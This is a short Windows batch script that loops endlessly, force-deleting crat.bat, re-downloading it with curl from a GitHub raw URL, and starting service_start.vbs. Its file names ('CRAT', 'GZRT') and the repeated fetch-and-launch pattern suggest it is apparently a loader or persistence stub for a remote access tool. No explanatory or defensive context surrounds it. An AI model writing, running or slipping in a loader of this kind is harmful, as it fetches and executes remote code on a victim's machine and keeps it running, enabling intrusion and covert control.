@echo off
:cr
timeout /t 3
del /f /s crat.bat
timeout /t 3
curl https://raw.githubusercontent.com/SeduHome/GZRT/refs/heads/main/CRAT>crat.bat
timeout /t 3
start service_start.vbs
goto cr